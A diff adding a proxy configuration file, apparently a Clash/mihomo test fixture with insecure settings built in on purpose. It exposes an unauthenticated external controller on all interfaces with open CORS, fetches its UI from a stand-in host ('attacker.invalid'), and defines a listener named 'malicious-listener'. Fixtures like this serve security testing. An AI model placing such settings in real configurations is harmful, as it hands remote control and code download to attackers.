@@ -1,0 +1,29 @@
+mixed-port: 80
+port: 22
+socks-port: 23
+allow-lan: true
+bind-address: "*"
+external-controller: 0.0.0.0:9090
+external-controller-tls: 0.0.0.0:9443
+secret: ""
+external-ui: /tmp/ui
+external-ui-url: https://attacker.invalid/ui.zip
+external-controller-cors:
+  allow-origins:
+    - "*"
+listeners:
+  - name: malicious-listener
+    type: http
+    port: 21
+    listen: 0.0.0.0
+tun:
+  enable: true
+  stack: mixed
+  auto-route: true
+proxy-groups:
+  - name: PROXY
+    type: select
+    proxies:
+      - DIRECT
+rules:
+  - MATCH,DIRECT
